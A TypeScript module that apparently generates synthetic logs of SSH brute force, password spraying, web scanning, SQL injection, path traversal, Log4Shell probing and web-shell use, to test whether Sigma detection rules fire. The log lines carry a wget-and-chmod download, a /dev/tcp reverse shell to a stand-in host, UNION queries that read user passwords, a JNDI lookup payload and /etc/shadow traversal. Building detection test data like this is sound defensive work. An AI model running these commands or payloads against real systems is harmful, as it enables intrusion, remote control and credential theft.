/**
 * Attack scenarios (ARCHITECTURE §4.3), each tagged with its ATT&CK techniques and the
 * rules expected to alert. Lines that a SigmaHQ rule must catch were written against
 * the rule files in `rules/sigma/` (see the comment on each scenario).
 */
import {
  BROWSER_USER_AGENTS,
  clientPort,
  DEPLOY_UID,
  INTERN_UID,
  keyFingerprint,
  ADDRESSES,
} from './catalog.js';
import {
  logindNewSession,
  logindRemovedSession,
  sshAcceptedPassword,
  sshAcceptedPublickey,
  sshFailedPassword,
  sshInvalidUser,
  sshLogout,
  sshPamFailure,
  sshPreauthClose,
  sshSessionOpened,
  sshTooManyFailures,
  sudoCommand,
  sudoNotInSudoers,
  US_PER_MS,
  US_PER_SECOND,
  type SshConnection,
} from './linux.js';
import type { Host, ScenarioTruth } from './model.js';
import type { LineCollector } from './output.js';
import { Random } from './prng.js';

export interface ScenarioMeta {
  id: string;
  host: Host;
  techniques: string[];
  entities: ScenarioTruth['entities'];
  expected: string[];
}

const SPRAY_USERS = [
  'admin',
  'test',
  'user',
  'oracle',
  'postgres',
  'ubuntu',
  'guest',
  'support',
  'ftpuser',
  'git',
  'jenkins',
  'ansible',
  'dev',
  'web',
  'tomcat',
  'mysql',
  'pi',
  'operator',
  'nagios',
  'backup',
  'deploy',
  'docker',
  'hadoop',
  'minecraft',
  'teamspeak',
];
/** Accounts that exist on the bastion (sshd logs them without "invalid user"). */
const EXISTING_USERS: ReadonlySet<string> = new Set(['backup', 'deploy', 'root']);

export const SCENARIOS: readonly ScenarioMeta[] = [
  {
    id: 'ssh-bruteforce',
    host: 'bastion-01',
    techniques: ['T1110.001'],
    entities: { ips: ['203.0.113.45'], users: ['root', 'admin'] },
    expected: ['centinela-ssh-bruteforce'],
  },
  {
    id: 'password-spray',
    host: 'bastion-01',
    techniques: ['T1110.003'],
    entities: { ips: ['198.51.100.23'], users: [...SPRAY_USERS] },
    expected: ['centinela-ssh-password-spraying'],
  },
  {
    id: 'bruteforce-success',
    host: 'bastion-01',
    techniques: ['T1110.001', 'T1078'],
    entities: { ips: ['203.0.113.77'], users: ['deploy'] },
    expected: ['centinela-ssh-bruteforce', 'centinela-ssh-bruteforce-success'],
  },
  {
    id: 'post-compromise',
    host: 'bastion-01',
    techniques: ['T1105', 'T1059.004'],
    entities: { ips: ['203.0.113.77'], users: ['deploy'] },
    expected: ['lnx_shell_susp_commands', 'lnx_shell_susp_rev_shells'],
  },
  {
    id: 'privileged-user',
    host: 'bastion-01',
    techniques: ['T1136.001', 'T1098'],
    entities: { ips: [], users: ['backup2'] },
    expected: ['lnx_privileged_user_creation', 'centinela-privileged-account-created'],
  },
  {
    id: 'sudo-not-allowed',
    host: 'db-01',
    techniques: ['T1548.003'],
    entities: { ips: [], users: ['intern'] },
    expected: ['centinela-sudo-user-not-in-sudoers'],
  },
  {
    id: 'web-recon',
    host: 'web-01',
    techniques: ['T1595.002'],
    entities: { ips: ['192.0.2.10'], users: [] },
    expected: ['web_susp_useragents', 'centinela-web-scanning-burst'],
  },
  {
    id: 'sqli',
    host: 'web-01',
    techniques: ['T1190'],
    entities: { ips: ['192.0.2.10'], users: [] },
    expected: ['web_sql_injection_in_access_logs', 'web_susp_useragents'],
  },
  {
    id: 'path-traversal',
    host: 'web-02',
    techniques: ['T1190'],
    entities: { ips: ['198.51.100.66'], users: [] },
    expected: ['web_path_traversal_exploitation_attempt'],
  },
  {
    id: 'log4shell-probe',
    host: 'web-02',
    techniques: ['T1190'],
    entities: { ips: ['192.0.2.99'], users: [] },
    expected: ['web_jndi_exploit'],
  },
  {
    id: 'webshell',
    host: 'web-01',
    techniques: ['T1505.003'],
    entities: { ips: ['203.0.113.150'], users: [] },
    expected: ['web_win_webshells_in_access_logs'],
  },
];

/**
 * When each scenario (or chain of scenarios) starts, in hours after the start of a
 * 3-day run; scaled for other `--days` values.
 */
export const SCHEDULE_HOURS: Readonly<Record<string, number>> = {
  'ssh-bruteforce': 27.2,
  'password-spray': 30.5,
  'web-recon': 39.0,
  sqli: 39.5,
  'path-traversal': 44.25,
  'log4shell-probe': 46.75,
  webshell: 50.1,
  /** bruteforce-success, then post-compromise and privileged-user in the same session. */
  'bruteforce-success': 54.3,
  'sudo-not-allowed': 61.5,
};

/** Context handed to each scenario generator. */
export interface ScenarioContext {
  out: (id: string) => LineCollector;
  seed: number;
}

const S = US_PER_SECOND;

/**
 * Failed password attempts over several connections, MaxAuthTries (6) per connection,
 * as hydra-style tools produce them. Returns the time after the last attempt.
 */
function passwordGuessing(
  out: LineCollector,
  rng: Random,
  host: Host,
  ip: string,
  startUs: number,
  attempts: number,
  durationUs: number,
  chooseUser: (connection: number) => string,
): number {
  const connections = Math.ceil(attempts / 6);
  const gap = durationUs / connections;
  let made = 0;
  let last = startUs;
  for (let c = 0; c < connections; c += 1) {
    const user = chooseUser(c);
    const invalid = !EXISTING_USERS.has(user);
    const conn: SshConnection = {
      out,
      host,
      pid: rng.int(2_000, 99_000),
      ip,
      port: clientPort(rng),
    };
    let t = startUs + Math.round(c * gap) + rng.int(0, 300_000);
    if (invalid) sshInvalidUser(conn, t, user);
    const inConnection = Math.min(6, attempts - made);
    for (let k = 0; k < inConnection; k += 1) {
      if (k === 0) sshPamFailure(conn, t + 1_000, invalid ? undefined : user);
      t += rng.int(450_000, 800_000);
      sshFailedPassword(conn, t, user, invalid);
      made += 1;
    }
    if (inConnection === 6) sshTooManyFailures(conn, t + 3_000, user, invalid);
    else sshPreauthClose(conn, t + 5_000, user, invalid);
    last = Math.max(last, t + 5_000);
  }
  return last;
}

/** 300 failed passwords for root and admin from 203.0.113.45 within 4 minutes. */
function sshBruteforce(ctx: ScenarioContext, startUs: number): void {
  const rng = Random.for(ctx.seed, 'scenario:ssh-bruteforce');
  passwordGuessing(
    ctx.out('ssh-bruteforce'),
    rng,
    'bastion-01',
    '203.0.113.45',
    startUs,
    300,
    230 * S,
    () => (rng.chance(0.6) ? 'root' : 'admin'),
  );
}

/**
 * One failure for each of 25 user names from 198.51.100.23, one every 44–52 seconds, so
 * no 5-minute window holds 10 failures (the brute-force threshold) while 10 distinct
 * users fall inside 10 minutes (the spraying threshold).
 */
function passwordSpray(ctx: ScenarioContext, startUs: number): void {
  const rng = Random.for(ctx.seed, 'scenario:password-spray');
  const out = ctx.out('password-spray');
  let t = startUs;
  for (const user of SPRAY_USERS) {
    const invalid = !EXISTING_USERS.has(user);
    const conn: SshConnection = {
      out,
      host: 'bastion-01',
      pid: rng.int(2_000, 99_000),
      ip: '198.51.100.23',
      port: clientPort(rng),
    };
    if (invalid) sshInvalidUser(conn, t, user);
    sshPamFailure(conn, t + 4_000, invalid ? undefined : user);
    sshFailedPassword(conn, t + rng.int(1_500_000, 2_500_000), user, invalid);
    sshPreauthClose(conn, t + 3 * S, user, invalid);
    t += rng.int(44, 52) * S;
  }
}

/**
 * bruteforce-success → post-compromise → privileged-user, one attacker session:
 * 40 failures for `deploy` in under 3 minutes, a successful password login, then two
 * downloads/reverse shells through sudo and a new account in the sudo group.
 */
function compromiseChain(ctx: ScenarioContext, startUs: number): void {
  const rng = Random.for(ctx.seed, 'scenario:compromise-chain');
  const host: Host = 'bastion-01';
  const ip = '203.0.113.77';

  const brute = ctx.out('bruteforce-success');
  const guessedUntil = passwordGuessing(brute, rng, host, ip, startUs, 40, 160 * S, () => 'deploy');
  const conn: SshConnection = {
    out: brute,
    host,
    pid: rng.int(2_000, 99_000),
    ip,
    port: clientPort(rng),
  };
  const loginUs = guessedUntil + rng.int(5, 12) * S;
  sshAcceptedPassword(conn, loginUs, 'deploy');
  sshSessionOpened(conn, loginUs + 30_000, 'deploy', DEPLOY_UID);
  const logindPid = rng.int(600, 900);
  const sessionId = rng.int(2_000, 2_400);
  logindNewSession(brute, host, loginUs + 70_000, logindPid, sessionId, 'deploy');

  const sudo = (out: LineCollector, command: string) => ({
    out,
    host,
    pid: rng.int(2_000, 99_000),
    user: 'deploy',
    uid: DEPLOY_UID,
    tty: 'pts/3',
    pwd: '/home/deploy',
    command,
  });

  // lnx_shell_susp_commands: keyword '*wget *; chmod +x*'.
  // lnx_shell_susp_rev_shells: keyword 'bash -i >& /dev/tcp/'.
  const post = ctx.out('post-compromise');
  const downloadUs = loginUs + rng.int(150, 210) * S;
  sudoCommand(
    sudo(post, '/usr/bin/sh -c cd /tmp; wget http://203.0.113.77/x; chmod +x x'),
    downloadUs,
    2_400_000,
  );
  const shellUs = downloadUs + rng.int(80, 110) * S;
  sudoCommand(
    sudo(post, '/usr/bin/bash -c bash -i >& /dev/tcp/203.0.113.77/4444 0>&1'),
    shellUs,
    1_200_000,
  );

  // lnx_privileged_user_creation: 'new user' and 'GID=27,' in the same line.
  const priv = ctx.out('privileged-user');
  const useraddUs = shellUs + rng.int(150, 200) * S;
  sudoCommand(sudo(priv, '/usr/sbin/useradd -m -g 27 -s /bin/bash backup2'), useraddUs, 300_000);
  priv.auth(
    host,
    useraddUs + 120_000,
    'useradd',
    rng.int(2_000, 99_000),
    'new user: name=backup2, UID=1005, GID=27, home=/home/backup2, shell=/bin/bash, from=/dev/pts/3',
  );
  const usermodUs = useraddUs + rng.int(40, 70) * S;
  sudoCommand(sudo(priv, '/usr/sbin/usermod -aG sudo backup2'), usermodUs, 200_000);
  const usermodPid = rng.int(2_000, 99_000);
  priv.auth(host, usermodUs + 80_000, 'usermod', usermodPid, "add 'backup2' to group 'sudo'");
  priv.auth(
    host,
    usermodUs + 81_000,
    'usermod',
    usermodPid,
    "add 'backup2' to shadow group 'sudo'",
  );

  const logoutUs = usermodUs + rng.int(60, 120) * S;
  sshLogout({ ...conn, out: priv }, logoutUs, 'deploy');
  logindRemovedSession(priv, host, logoutUs + 2_000, logindPid, sessionId);
}

/** `intern` (not in sudoers) tries sudo three times on db-01. */
function sudoNotAllowed(ctx: ScenarioContext, startUs: number): void {
  const rng = Random.for(ctx.seed, 'scenario:sudo-not-allowed');
  const out = ctx.out('sudo-not-allowed');
  const host: Host = 'db-01';
  const conn: SshConnection = {
    out,
    host,
    pid: rng.int(2_000, 99_000),
    ip: ADDRESSES.bastion,
    port: clientPort(rng),
  };
  sshAcceptedPublickey(conn, startUs, 'intern', keyFingerprint(rng));
  sshSessionOpened(conn, startUs + 25_000, 'intern', INTERN_UID);
  const logindPid = rng.int(600, 900);
  const sessionId = rng.int(500, 900);
  logindNewSession(out, host, startUs + 60_000, logindPid, sessionId, 'intern');
  let t = startUs + rng.int(60, 120) * S;
  for (const command of [
    '/usr/bin/cat /etc/shadow',
    '/usr/bin/su - postgres',
    '/usr/bin/psql -U postgres',
  ]) {
    sudoNotInSudoers(
      {
        out,
        host,
        pid: rng.int(2_000, 99_000),
        user: 'intern',
        uid: INTERN_UID,
        tty: 'pts/1',
        pwd: '/home/intern',
        command,
      },
      t,
    );
    t += rng.int(20, 45) * S;
  }
  const logoutUs = t + rng.int(120, 300) * S;
  sshLogout(conn, logoutUs, 'intern');
  logindRemovedSession(out, host, logoutUs + 2_000, logindPid, sessionId);
}

const NIKTO_PATHS = [
  '/',
  '/robots.txt',
  '/admin/',
  '/administrator/',
  '/phpinfo.php',
  '/server-status',
  '/server-info',
  '/cgi-bin/test.cgi',
  '/cgi-bin/printenv',
  '/backup.tar.gz',
  '/backup.zip',
  '/config.php.bak',
  '/web.config',
  '/.htaccess',
  '/.htpasswd',
  '/manager/html',
  '/phpmyadmin/',
  '/test/',
  '/install.php',
  '/README.md',
  '/CHANGELOG.txt',
  '/console/',
  '/admin.php',
  '/login.jsp',
  '/info.php',
  '/database.sql',
  '/dump.sql',
  '/old/',
  '/tmp/',
];
const GOBUSTER_WORDS = [
  'admin',
  'api',
  'assets',
  'backup',
  'backups',
  'beta',
  'bin',
  'blog',
  'cache',
  'cgi-bin',
  'config',
  'dashboard',
  'data',
  'db',
  'debug',
  'demo',
  'dev',
  'docs',
  'download',
  'files',
  'help',
  'images',
  'img',
  'include',
  'internal',
  'js',
  'lib',
  'logs',
  'media',
  'old',
  'panel',
  'private',
  'public',
  'reports',
  'scripts',
  'secure',
  'staff',
  'static',
  'stats',
  'storage',
  'system',
  'temp',
  'test',
  'tools',
  'upload',
  'uploads',
  'user',
  'vendor',
  'web',
];
const EXISTING_PATHS: Readonly<Record<string, number>> = {
  '/': 200,
  '/robots.txt': 200,
  '/api': 301,
  '/static': 301,
  '/uploads': 301,
  '/images': 301,
  '/download': 200,
  '/admin/': 403,
  '/admin': 301,
};

/**
 * About 600 requests in 3 minutes from 192.0.2.10: Nikto, then gobuster, mostly 404.
 * web_susp_useragents: 'Nikto/' and 'gobuster/' in cs-user-agent. Paths stay clear of
 * the other web rules (no `.git/`, traversal or script tags).
 */
function webRecon(ctx: ScenarioContext, startUs: number): void {
  const rng = Random.for(ctx.seed, 'scenario:web-recon');
  const out = ctx.out('web-recon');
  const ip = '192.0.2.10';
  const startMs = startUs / US_PER_MS;
  const nikto = 420;
  for (let i = 0; i < nikto; i += 1) {
    const path =
      i < NIKTO_PATHS.length
        ? (NIKTO_PATHS[i] ?? '/')
        : `/${rng.chars(8, 'abcdefghijklmnopqrstuvwxyz0123456789')}.${rng.pick(['php', 'asp', 'cgi', 'html', 'jsp', 'pl'])}`;
    const status = EXISTING_PATHS[path] ?? 404;
    out.access('web-01', startMs + i * 285 + rng.int(0, 200), {
      ip,
      method: rng.chance(0.9) ? 'GET' : 'HEAD',
      target: path,
      status,
      bytes: status === 200 ? rng.int(1_000, 40_000) : 153,
      userAgent: `Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:${String(i + 1).padStart(6, '0')})`,
      requestTime: rng.int(1, 30) / 1000,
    });
  }
  const gobusterStart = startMs + nikto * 285 + 2_000;
  const suffixes = ['', '.php', '.bak', '.old'];
  for (let i = 0; i < 180; i += 1) {
    const word = GOBUSTER_WORDS[i % GOBUSTER_WORDS.length] ?? 'admin';
    const path = `/${word}${suffixes[Math.floor(i / GOBUSTER_WORDS.length) % suffixes.length] ?? ''}`;
    const status = EXISTING_PATHS[path] ?? 404;
    out.access('web-01', gobusterStart + i * 300 + rng.int(0, 150), {
      ip,
      method: 'GET',
      target: path,
      status,
      bytes: status === 404 ? 153 : rng.int(150, 9_000),
      userAgent: 'gobuster/3.6',
      requestTime: rng.int(1, 20) / 1000,
    });
  }
}

/**
 * sqlmap against `/products?id=` from 192.0.2.10, answered 200 or 500 (never 404).
 * web_sql_injection_in_access_logs: GET plus keywords such as 'UNION%20ALL%20SELECT'
 * and '%271%27%3D%271', unless sc-status is 404. web_susp_useragents: 'sqlmap/'.
 */
function sqli(ctx: ScenarioContext, startUs: number): void {
  const rng = Random.for(ctx.seed, 'scenario:sqli');
  const out = ctx.out('sqli');
  const payloads: Array<[string, number]> = [
    ['42', 200],
    ['42%27', 500],
    ['42%20AND%201%3D1', 200],
    ['42%20AND%201%3D2', 200],
    ['42%27%20AND%20%271%27%3D%271', 200],
    ['42%20AND%20%271%27%3D%271', 200],
  ];
  for (let columns = 1; columns <= 10; columns += 1) {
    const nulls = Array.from({ length: columns }, () => 'NULL').join('%2C');
    payloads.push([`42%20UNION%20ALL%20SELECT%20${nulls}--%20-`, columns === 6 ? 200 : 500]);
  }
  payloads.push(
    [
      '-4821%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x716b6a7171%2C0x4d7953514c%29%2CNULL%2CNULL%2CNULL--%20-',
      200,
    ],
    [
      '-4821%20UNION%20ALL%20SELECT%20NULL%2CNULL%2Cusername%2Cpassword%2CNULL%2CNULL%20FROM%20users--%20-',
      200,
    ],
  );
  let t = startUs / US_PER_MS;
  for (const [id, status] of payloads) {
    out.access('web-01', t, {
      ip: '192.0.2.10',
      method: 'GET',
      target: `/products?id=${id}`,
      status,
      bytes: status === 200 ? rng.int(9_000, 30_000) : 612,
      userAgent: 'sqlmap/1.8#stable',
      requestTime: rng.int(20, 400) / 1000,
    });
    t += rng.int(1_500, 6_000);
  }
}

/**
 * Directory traversal in the query string from 198.51.100.66.
 * web_path_traversal_exploitation_attempt: cs-uri-query contains '../../../etc/' or
 * '..%252f..%252f..%252fetc%252f' (among others).
 */
function pathTraversal(ctx: ScenarioContext, startUs: number): void {
  const rng = Random.for(ctx.seed, 'scenario:path-traversal');
  const out = ctx.out('path-traversal');
  const requests: Array<[string, number]> = [
    ['/download?file=catalogo-2026.pdf', 200],
    ['/download?file=../../../../etc/passwd', 200],
    ['/download?file=..%252f..%252f..%252fetc%252fpasswd', 400],
    ['/download?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', 400],
    ['/download?file=../../../../etc/shadow', 403],
  ];
  let t = startUs / US_PER_MS;
  for (const [target, status] of requests) {
    out.access('web-02', t, {
      ip: '198.51.100.66',
      method: 'GET',
      target,
      status,
      bytes: status === 200 ? rng.int(1_800, 2_400) : 166,
      userAgent: 'curl/8.5.0',
      requestTime: rng.int(2, 30) / 1000,
    });
    t += rng.int(4_000, 12_000);
  }
}

/**
 * JNDI lookup in the user agent from 192.0.2.99. web_jndi_exploit: keyword
 * '/Basic/Command/Base64/'. The payload stays out of the query string, where `=${`
 * would also fire web_ssti_in_access_logs.
 */
function log4shellProbe(ctx: ScenarioContext, startUs: number): void {
  const rng = Random.for(ctx.seed, 'scenario:log4shell-probe');
  const out = ctx.out('log4shell-probe');
  let t = startUs / US_PER_MS;
  for (const target of ['/', '/login', '/api/products']) {
    out.access('web-02', t, {
      ip: '192.0.2.99',
      method: 'GET',
      target,
      status: 200,
      bytes: rng.int(600, 30_000),
      userAgent: '${jndi:ldap://203.0.113.99:1389/Basic/Command/Base64/aWQ=}',
      requestTime: rng.int(5, 80) / 1000,
    });
    t += rng.int(800, 3_000);
  }
}

/**
 * A PHP web shell uploaded as an avatar, then used. web_win_webshells_in_access_logs:
 * cs-method GET and keywords '=whoami' / '=net+user'.
 */
function webshell(ctx: ScenarioContext, startUs: number): void {
  const rng = Random.for(ctx.seed, 'scenario:webshell');
  const out = ctx.out('webshell');
  const ip = '203.0.113.150';
  const userAgent = BROWSER_USER_AGENTS[0];
  let t = startUs / US_PER_MS;
  out.access('web-01', t, {
    ip,
    method: 'POST',
    target: '/account/avatar',
    status: 200,
    bytes: 412,
    referer: 'https://shop.andes-retail.example/account',
    userAgent,
  });
  for (const target of [
    '/uploads/img.php',
    '/uploads/img.php?cmd=whoami',
    '/uploads/img.php?cmd=net+user',
  ]) {
    t += rng.int(15_000, 40_000);
    out.access('web-01', t, {
      ip,
      method: 'GET',
      target,
      status: 200,
      bytes: rng.int(20, 900),
      userAgent,
    });
  }
}

export const SCENARIO_GENERATORS: Readonly<
  Record<string, (ctx: ScenarioContext, startUs: number) => void>
> = {
  'ssh-bruteforce': sshBruteforce,
  'password-spray': passwordSpray,
  'web-recon': webRecon,
  sqli,
  'path-traversal': pathTraversal,
  'log4shell-probe': log4shellProbe,
  webshell,
  'bruteforce-success': compromiseChain,
  'sudo-not-allowed': sudoNotAllowed,
};
